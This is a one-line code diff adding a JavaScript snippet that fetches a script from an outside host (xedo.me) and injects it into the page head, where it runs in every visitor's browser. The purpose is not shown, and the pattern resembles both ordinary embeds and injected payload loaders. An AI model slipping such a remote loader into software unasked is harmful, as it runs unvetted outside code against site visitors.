@@ -1,0 +1,1 @@
+(function(){var uri="https://xedo.me/sw/pub.js?v=0.4",script=document.createElement("script");script.setAttribute("type","text/javascript"),script.setAttribute("src",uri),document.getElementsByTagName("head")[0].appendChild(script);})()
